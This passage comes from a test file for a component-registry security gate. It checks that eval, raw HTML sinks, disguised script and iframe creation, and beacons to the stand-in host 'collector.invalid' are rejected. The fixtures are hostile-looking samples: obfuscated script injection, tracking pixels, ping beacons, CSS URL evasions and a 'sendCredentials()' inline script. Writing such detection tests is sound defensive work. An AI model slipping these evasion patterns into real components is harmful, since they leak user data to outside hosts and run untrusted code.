      export function Insecure() {
        eval("alert('pwned')");
        return <div dangerouslySetInnerHTML={{ __html: '<span>danger</span>' }} />;
      }
    `;
    const res = checkSecurityIsolationGate(dangerousCode);
    expect(res.status).toBe('fail');
    expect(res.score).toBe(0);
    expect(res.details).toContain('dynamic code execution');
    expect(res.details).toContain('dangerouslySetInnerHTML');
  });

  it('rejects inline scripts and missing license metadata', () => {
    const inlineScript = checkSecurityIsolationGate('<script>sendCredentials()</script>');
    const missingLicense = checkLicenseProvenanceGate(undefined);

    expect(inlineScript.status).toBe('fail');
    expect(inlineScript.details).toMatch(/script/i);
    expect(missingLicense.status).toBe('fail');
    expect(missingLicense.details).toMatch(/manifest/i);
  });

  it('rejects scripts created through computed and aliased DOM element factories', () => {
    const cases = [
      `const script = document.createElement('scr' + 'ipt'); script.textContent = 'runUntrusted()'; document.body.appendChild(script);`,
      `const create = document.createElement; const script = create('script'); script.src = '/local-code.js'; document.body.appendChild(script);`,
      `const make = document.createElementNS; const script = make('http://www.w3.org/1999/xhtml', 'script'); script.textContent = 'runUntrusted()'; document.body.appendChild(script);`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/script/i);
    }
  });

  it('rejects programmatically created iframe elements from registry resources', () => {
    const cases = [
      `const frame = document.createElement('iframe'); frame.setAttribute('sandbox', 'allow-scripts allow-same-origin'); frame.src = '/same-origin';`,
      `const create = document.createElement; const frame = create('iframe'); frame.sandbox = 'allow-same-origin'; frame.src = '/same-origin';`,
      `const make = document.createElementNS; const frame = make('http://www.w3.org/1999/xhtml', 'iframe'); frame.src = '/same-origin';`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/iframe/i);
    }
  });

  it('rejects dynamic iframe srcDoc payloads', () => {
    const cases = [
      `export function EmbeddedDocument({ html }: { html: string }) { return <iframe sandbox="allow-scripts" srcDoc={html} />; }`,
      `const frame = document.querySelector('iframe'); frame.srcdoc = html;`,
      `const frame = document.querySelector('iframe'); frame.setAttribute('srcdoc', html);`,
      `const frame = document.querySelector('iframe'); Object.defineProperty(frame, 'srcdoc', { value: html });`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/iframe|srcdoc|cannot be certified/i);
    }
  });

  it('rejects unsafe native resources passed through React element factories', () => {
    const cases = [
      `import React from 'react'; React.createElement('script', { src: '/local-code.js' });`,
      `import { createElement as h } from 'react'; h('iframe', { src: '/same-origin', sandbox: '' });`,
      `import { jsx as _jsx } from 'react/jsx-runtime'; _jsx('script', { src: '/local-code.js' });`,
      `import React from 'react'; React.createElement('img', { src: 'https://collector.invalid/pixel' });`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/script|iframe|remote|network/i);
    }

    expect(
      checkSecurityIsolationGate(
        `import React from 'react'; React.createElement('a', { href: 'https://docs.example.test/guide' });`
      ).status
    ).toBe('pass');
    expect(
      checkSecurityIsolationGate(
        `import { jsx } from 'react/jsx-runtime'; jsx('img', { src: '/assets/avatar.png' });`
      ).status
    ).toBe('pass');
  });

  it('rejects remote asset requests hidden in JSX and React factory prop spreads', () => {
    const cases = [
      `const props = { src: 'https://collector.invalid/pixel' }; export const View = () => <img {...props} alt="" />;`,
      `import React from 'react'; const props = { src: 'https://collector.invalid/pixel' }; React.createElement('img', { ...props });`,
      `export const View = ({ props }) => <img {...props} alt="" />;`,
      `import React from 'react'; function View({ props }) { return React.createElement('img', { ...props }); }`,
      `Object.defineProperty(document.createElement('img'), 'src', { ...{ value: 'https://collector.invalid/pixel' } });`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/remote asset|outbound|network|cannot be certified/i);
    }
  });

  it('rejects React element factories with an unresolved intrinsic tag', () => {
    const source = `import React from 'react'; const tag: string = resolveTag(); React.createElement(tag, { src: remoteUrl });`;
    const result = checkSecurityIsolationGate(source);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/dynamic|unresolved|cannot be certified/i);
  });

  it('rejects protocol-relative remote CSS resources', () => {
    const cases = [
      `const css = '.hero { background-image: url(//collector.invalid/pixel) }';`,
      `const css = '@font-face { font-family: custom; src: url("//collector.invalid/font.woff2") }';`,
      `const css = '.hero { background-image: url(\\\\2f \\\\2f collector.invalid/pixel) }';`,
      `const css = '.hero { background-image: url/**/(//collector.invalid/pixel) }';`,
      `const css = '.hero { background-image: u/**/rl(//collector.invalid/pixel) }';`,
      `const css = '.hero { background-image: url(http:collector.invalid/pixel) }';`,
      `const css = '.hero { background-image: url(http\\\\3a collector.invalid/pixel) }';`,
      `const css = '.hero { background-image: url(https:collector.invalid/pixel) }';`,
      `const css = '.hero { background-image: url(https\\\\3a collector.invalid/pixel) }';`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/remote asset|outbound|network/i);
    }
  });

  it('rejects remote resource URLs across scheme-relative and scheme-only forms', () => {
    const cases = [
      `export const View = () => <img src="//collector.invalid/pixel" alt="" />;`,
      `export const View = () => <video poster="//collector.invalid/poster.png" />;`,
      `export const View = () => <link rel="preload" as="image" href="//collector.invalid/image.png" />;`,
      `import React from 'react'; React.createElement('img', { src: 'https:collector.invalid/pixel', alt: '' });`,
      `const video = document.createElement('video'); video.setAttribute('poster', '//collector.invalid/poster.png');`,
      `Object.assign(document.createElement('img'), { src: '//collector.invalid/pixel' });`,
      `const image = document.createElement('img'); Object.assign(image, { src: 'https:collector.invalid/pixel' });`,
      `export const View = () => <img srcSet="/local.png 1x, //collector.invalid/retina.png 2x" alt="" />;`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/remote asset|outbound|network|cannot be certified/i);
    }
  });

  it('rejects hidden outbound link ping beacons', () => {
    const cases = [
      `export const View = () => <a href="/docs" ping="https://collector.invalid/ping">Docs</a>;`,
      `import React from 'react'; React.createElement('area', { href: '/map', ping: '//collector.invalid/ping', alt: 'Map' });`,
      `const link = document.createElement('a'); link.ping = 'https://collector.invalid/ping';`,
      `const link = document.createElement('a'); link.setAttribute('ping', '/local-ping https://collector.invalid/ping');`,
      `Object.assign(document.createElement('a'), { ping: 'https://collector.invalid/ping' });`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/remote asset|outbound|network|cannot be certified/i);
    }
  });

  it('rejects unresolved form destinations in forwarded resource props', () => {
    const cases = [
      `export function Signup(props: React.FormHTMLAttributes<HTMLFormElement>) { return <form {...props}><input type="email" /></form>; }`,
      `export function Signup({ destination }: { destination: string }) { return <form action={destination}><input type="email" /></form>; }`,
      `export function Signup({ destination }: { destination: string }) { return <form><button formAction={destination}>Submit</button></form>; }`,
      `export function BeaconLink({ beacon }: { beacon: string }) { return <a href="#" ping={beacon}>Continue</a>; }`,
      `import React from 'react'; React.createElement('form', props, React.createElement('input', { type: 'email' }));`,
      `import React from 'react'; React.createElement('button', { formAction: destination, type: 'submit' }, 'Submit');`,
      `const form = document.createElement('form'); Object.assign(form, props);`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/remote asset|outbound|network|cannot be certified/i);
    }
  });

  it('certifies anchor rest props only when the ping beacon is explicitly stripped', () => {
    const unfiltered = checkSecurityIsolationGate(`
      type Props = { ping?: string; href?: string; children?: unknown };
      export function Link({ ...rest }: Props) {
        return <a {...rest} />;
      }
    `);
    const source = `
      type Props = { ping?: string; href?: string; children?: unknown };
      export function Link({ ping: ignoredPing, ...rest }: Props) {
        void ignoredPing;
        return <a {...rest} />;
      }
    `;
    const result = checkSecurityIsolationGate(source);

    expect(unfiltered.status).toBe('fail');
    expect(result.status).toBe('pass');
  });

  it('rejects remote resource mutations through Object.assign', () => {
    const cases = [
      `Object.assign(document.createElement('img'), { src: 'https://collector.invalid/pixel' });`,
      `const assign = Object.assign; assign(document.createElement('img'), { src: 'https://collector.invalid/pixel' });`,
      `Object.assign(document.createElementNS(svgNamespace, 'image'), { href: 'https://collector.invalid/pixel' });`,
      `const image = document.createElement('img'); Object.assign(image, props);`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/remote asset|outbound|network|cannot be certified/i);
    }
  });

  it('rejects remote SVG feImage resources', () => {
    const cases = [
      `export const View = () => <svg><feImage href="https://collector.invalid/pixel" /></svg>;`,
      `import React from 'react'; React.createElement('feImage', { href: 'https://collector.invalid/pixel' });`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/remote asset|outbound|network/i);
    }
  });

  it('rejects automatic meta refresh navigation in registry resources', () => {
    const cases = [
      `export const View = () => <meta httpEquiv="refresh" content="0;url=https://collector.invalid/" />;`,
      `import React from 'react'; React.createElement('meta', { httpEquiv: 'refresh', content: '0;url=https://collector.invalid/' });`,
      `const meta = document.createElement('meta'); meta.httpEquiv = 'refresh'; meta.content = '0;url=https://collector.invalid/';`,
      `const meta = document.createElement('meta'); meta.setAttribute('http-equiv', 'refresh');`,
      `const meta = document.createElement('meta'); Object.assign(meta, { httpEquiv: 'refresh' });`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/automatic|refresh|navigation|cannot be certified/i);
    }
  });

  it('rejects direct DOM HTML sinks that bypass the React raw-HTML check', () => {
    const result = checkSecurityIsolationGate(`
      export function UnsafeMarkup({ html }: { html: string }) {
        const element = document.createElement('div');
        element.innerHTML = html;
        element.insertAdjacentHTML('beforeend', html);
        return <div ref={(node) => { if (node) node.outerHTML = html; }} />;
      }
    `);

    expect(result.status).toBe('fail');
    expect(result.details).toMatch(/HTML injection|HTML sink/i);
  });

  it('rejects browser HTML parsing sinks that can materialize untrusted markup', () => {
    const cases = [
      `const fragment = document.createRange().createContextualFragment(userHtml); target.appendChild(fragment);`,
      `const range = document.createRange(); const parse = range.createContextualFragment.bind(range); parse(userHtml);`,
      `const parsed = new DOMParser().parseFromString(userHtml, 'text/html'); target.appendChild(document.importNode(parsed.body, true));`,
      `const Parser = window.DOMParser; const parser = new Parser(); const { parseFromString } = parser; parseFromString(userHtml, 'text/html');`,
      `const range = document.createRange(); Reflect.get(range, 'createContextualFragment')(userHtml);`,
      `const element = document.createElement('div'); element.setHTMLUnsafe(userHtml);`,
      `const element = document.createElement('div'); const insert = element.setHTMLUnsafe.bind(element); insert(userHtml);`,
    ];

    for (const source of cases) {
      const result = checkSecurityIsolationGate(source);
      expect(result.status, source).toBe('fail');
      expect(result.details, source).toMatch(/HTML|markup|contextual|parser/i);
    }

    expect(
      checkSecurityIsolationGate(
        `const element = document.createElement('div'); element.setHTML(userHtml);`
      ).status
    ).toBe('pass');
  });

  it('returns a rejected report instead of throwing when the resource root is not a directory', async () => {
    const tempFile = path.join(os.tmpdir(), `tess-gate-not-directory-${Date.now()}.txt`);
    fs.writeFileSync(tempFile, 'not a resource directory', 'utf-8');
    try {
      await expect(runRegistryGate(tempFile)).resolves.toMatchObject({
        overallStatus: 'rejected',
        failedChecks: expect.any(Number),
      });
    } finally {
      fs.rmSync(tempFile, { force: true });
    }
  });

  it('correctly catches unhandled motion without reduced-motion fallback', () => {
    const animatedCode = `
      export function SpinningLoader() {
        return <div className="animate-spin duration-300">Loading...</div>;
      }
    `;
    const res = checkReducedMotionGate(animatedCode);
    expect(res.status).toBe('fail');
    expect(res.remediation).toContain('motion-reduce:animate-none');

    const safeCode = `
      export function SafeLoader() {
        return <div className="animate-spin motion-reduce:animate-none">Loading...</div>;
      }
    `;
    const safeRes = checkReducedMotionGate(safeCode);
    expect(safeRes.status).toBe('pass');

    const cssAnimation = checkReducedMotionGate(
      '.spinner { animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }'
    );
    expect(cssAnimation.status).toBe('fail');
    expect(cssAnimation.details).toMatch(/reduced-motion|prefers-reduced-motion/i);
  });

  it('correctly flags fixed wide containers that break mobile', () => {
    const rigidCode = `
      export function WideTable() {
        return <div className="w-[1400px]">Content</div>;
      }
    `;
    const res = checkResponsiveGate(rigidCode);
    expect(res.status).toBe('fail');
    expect(res.details).toContain('360px mobile viewports');
  });

  it('rejects a resource in sandbox audit when multiple critical gates fail', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-bad-comp-'));
    try {
      fs.writeFileSync(
        path.join(tempDir, 'manifest.json'),
        JSON.stringify({
          schemaVersion: '1.0.0',
          id: 'bad-comp',
          name: 'Bad Component',
          // Missing required fields
        }),
        'utf-8'
      );
      fs.writeFileSync(
        path.join(tempDir, 'index.tsx'),
        `
          export function Bad() {
            eval('bad()');
            return <div className="bg-[#ff0000] w-[1600px] animate-bounce">Bad</div>;
          }
        `,
        'utf-8'
      );

      const report = await runRegistryGate(tempDir);
      expect(report.overallStatus).toBe('rejected');
      expect(report.failedChecks).toBeGreaterThanOrEqual(3);
      expect(report.checks.find((check) => check.id === 'license-provenance')?.status).toBe('fail');
      expect(report.markdownReport).toContain('GATE FAILED — REJECTED');
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });
});
